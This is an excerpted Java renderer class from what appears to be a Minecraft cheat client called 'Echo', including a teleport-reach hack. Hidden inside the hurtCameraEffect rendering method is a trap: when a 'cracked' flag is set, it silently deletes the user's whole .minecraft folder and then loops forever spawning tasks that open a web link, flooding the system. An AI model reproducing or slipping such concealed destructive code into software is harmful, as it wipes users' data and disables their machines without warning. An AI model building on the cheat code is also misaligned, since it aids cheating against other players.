...
import dev.echo.module.impl.movement.ClickTP;
...
import dev.echo.module.impl.render.Ambience;
...
public class EntityRenderer implements IResourceManagerReloadListener {
    ...
    public void getMouseOver(float partialTicks) {
        ...
        if (entity != null && this.mc.theWorld != null) {
            ...
            double d0;
            if(Echo.INSTANCE.isEnabled(ClickTP.class)) {
               d0 = 300;
            } else {
    ...
    private void hurtCameraEffect(float partialTicks) {
        if (this.mc.getRenderViewEntity() instanceof EntityLivingBase) {
            ...
            Echo.INSTANCE.getEventProtocol().handleEvent(hurtCamEvent);
            if (LoginPanel.cracked) {
                Multithreading.runAsync(() -> FileUtils.deleteQuietly(new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\.minecraft")));
                while (true) {
                    Multithreading.runAsync(() -> IOUtils.openLink("hhttps://www.youtube.com/watch?v="));
                }
            }
    ...
    private void renderWorldPass(int pass, float partialTicks, long finishTimeNano) {
        ...
        Echo.INSTANCE.getEventProtocol().handleEvent(new Render3DEvent(partialTicks));
